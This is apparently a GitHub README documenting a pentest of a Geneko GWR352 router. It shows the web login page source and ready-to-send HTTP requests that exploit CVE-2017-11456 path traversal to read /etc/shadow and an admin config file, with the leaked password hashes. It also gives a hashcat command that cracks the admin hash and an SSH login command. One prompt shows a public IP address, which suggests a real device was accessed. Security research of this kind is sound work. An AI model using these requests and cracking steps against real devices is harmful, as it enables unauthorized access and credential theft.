# Geneko GWR352 Pentesting

![image](https://user-images.githubusercontent.com/72421091/133135861-58123964-f897-4f29-9b14-6de6bcacb6f4.png)

## To do

## User manual

## Web page

Login page port 80

![image](https://user-images.githubusercontent.com/72421091/133136116-241dd48a-8930-488f-aaeb-c984e57ebb35.png)

```html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">

<html>
	<head>
		<meta name="generator" content="HTML Tidy, see www.w3.org">
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
		<!-- GKO: Alternate CSS links -->
		<link href="files/ruter.css" title="non-ie" type="text/css" rel="stylesheet">
		<link href="files/ruter-ie.css" title="ie" type="text/css" rel="alternate stylesheet">
		<script type="text/javascript">ignoreAjaxAlert = 0; interval_pionter = 0; first_start = true;</script>
		<script type="text/javascript" src="lib/customization.js"></script>
		<script type="text/javascript" src="lib/framework.js"></script>
		<script type="text/javascript" src="lib/commons.js"></script>
		<script type="text/javascript" src="lib/index.js"></script>
		<script type="text/javascript" src="lib/jsong.js"></script>
		<script type="text/javascript" src="lib/admin.js"></script>
		<script type="text/javascript" src="lib/adsl.js"></script>
		<script type="text/javascript" src="lib/cli.js"></script>
		<script type="text/javascript" src="lib/dhcpser.js"></script>
		<script type="text/javascript" src="lib/dmz.js"></script>
		<script type="text/javascript" src="lib/dynDNS.js"></script>
		<script type="text/javascript" src="lib/encoder.js"></script>
		<script type="text/javascript" src="lib/firewall.js"></script>
		<script type="text/javascript" src="lib/gpio.js"></script>
		<script type="text/javascript" src="lib/management.js"></script>
		<script type="text/javascript" src="lib/network.js"></script>
		<script type="text/javascript" src="lib/openVPN.js"></script>
		<script type="text/javascript" src="lib/secur.js"></script>
		<script type="text/javascript" src="lib/smsControl.js"></script>
		<script type="text/javascript" src="lib/status.js"></script>
		<script type="text/javascript" src="lib/upsSettings.js"></script>
		<script type="text/javascript" src="lib/vpn.js"></script>
		<script type="text/javascript" src="lib/wanSettings.js"></script>
		<script type="text/javascript">document.write(html_title);</script>
	</head>

	<body onload="init();">
		<iframe src="" id="loading" style="display:none;border:none"></iframe>
		<img id="loading_img" src="files/loader.gif"/>
		<img id="loading_img2" style="display:none;z-index:111000;position:absolute;width:31px;height:31px;border:none;" src="files/loader.gif"/>

		<div id="loadingOverThePanes" style="background-color:white;filter:alpha(opacity=70);-moz-opacity:.70;opacity:.70;
			margin:0px;padding:0px;display:none;position:absolute;z-index:110000;">
		</div>

		<div id="zaglavlje">
			<table cellspacing="0px" cellpadding="0px" width="100%">
				<tr>
					<td style="background-image:url('files/piks1.jpg');background-repeat: repeat-x">
						<img alt="logo" src="files/zaglnovo.jpg" usemap="#zaglmap"/>
					</td>
					<td style="font-size:40px;font-style:bold;"></td>
				</tr>
			</table>
		</div>
		<div id="logout">
			<!--a href="javascript: logout();"><span id="logoutA">Logout </span> </a> &nbsp;  -->
		</div>

		<map id ="zaglmap" name="zaglmap">
			<area shape="rect" coords="0,0,200,70" href="javascript:open_url();"/>
		</map>
		<table id="tabPocetna">
			<tr>
				<td id="tdLevimeni" rowspan="2">
					<div id="meni"></div>
				</td>
				<td id="tdGlavni">
					<div id="divOkvir"></div>
				</td>
			</tr>
		</table>
		<div id="futer">
			<span>
				Copyright &copy; <script>document.write(copyright_year + ' '); document.write(copyright_company);</script>. All rights reserved.<br>
				<script>document.write(company_link);</script>
			</span>
		</div>

		<div id="dAlert" class="aler"></div>
		<div id="dOkCancel" class="aler"></div>
		<iframe src="" id="box" style="border:none;display:none;"></iframe>
	</body>
</html>
```

Default administration credentials are admin/admin (User Manual). It didin't work in my case.  

## Vulnerability

Using (routersploit) and searching, i found that the router vulnerable to a Unauthenticated Path Traversal vulnerability CVE-2017-11456

### Vulnerability Details : CVE-2017-11456 

Geneko GWR routers allow directory traversal sequences starting with a /../ substring, as demonstrated by unauthenticated read access to the configuration file.

### Exploit
https://www.exploit-db.com/exploits/44072

sending the following GET request to read **/etc/shadow** file :

```
GET /help/../../../../../../../../../../../../../../../../etc/shadow HTTP/1.1
Host: 10.10.10.10
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
```
HTTP/1.1 200 OK
Connection: close
ETag: "38-183-384313b8"
Last-Modified: Tue, 30 Nov 1999 00:00:56 GMT
Date: Mon, 06 Dec 1999 03:41:08 GMT
Content-Type: application/octet-stream
Content-Length: 387

root:$1$ryjw5yTs$xoQlzavABZ5c7gQuD7jKO0:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
daemon:*:10933:0:99999:7:::
adm:*:10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
shutdown:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
admin:$1$7UH.tba/$UB7VOJ/QlDWu0ReqtjNfR.:10933:0:99999:7:::
```

Using hashcat to crack the hash password
```
hashcat -m 500 /root/.hashcat/hash3.txt /root/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-75.txt
```
```
$1$7UH.tba/$UB7VOJ/QlDWu0ReqtjNfR.:admin
```

You can use https://www.onlinehashcrack.com/ 

![image](https://user-images.githubusercontent.com/72421091/133137696-11d7d281-e1d2-47a8-91bd-c5dedefd0477.png)

For the web login we can find the password using the exploit to read config files

```
GET /../../../../../../../../../../../../../../../../../mnt/flash/params/j_admin_admin.params HTTP/1.1
Host: 10.10.10.10
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
```
HTTP/1.1 200 OK
Connection: close
ETag: "626e-7a-38431681"
Last-Modified: Tue, 30 Nov 1999 00:12:49 GMT
Date: Mon, 06 Dec 1999 04:17:40 GMT
Content-Type: application/octet-stream
Content-Length: 122


{"enable":true,"username":"admin","password":"XXXX","web_access":0,"http_port":80,"https_port":443,"gui_timeout":15}

```
We found the password for the web interface 

![image](https://user-images.githubusercontent.com/72421091/133138429-9fd5ee8a-4b35-422a-9e74-8dc409ddf913.png)

## SSH

CLI can be acces via SSH

![image](https://user-images.githubusercontent.com/72421091/133138635-49fc9307-8a80-4d40-8411-ccb6b107fcf2.png)

ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.10

admin@105.73.195.49's password: (password form the CLI interface settings for SSH)

```
 ----------------------------------------
  GWR Router Command Line Interface v0.8
 ----------------------------------------
  MAIN MODE
 -----------

 v - VIEW mode
 e - EDIT mode
 h - HELP
 x - quit

choose mode>
```

We can found all the available commands here (GWR-CLI-Documentation.pdf)[CLI/GWR-CLI-Documentation.pdf]

## Filesystem

We can use the path travaersal exploit to search for files

The cli file can be found at /root/cli (leaked form the /etc/passwd)



## Detailed solution
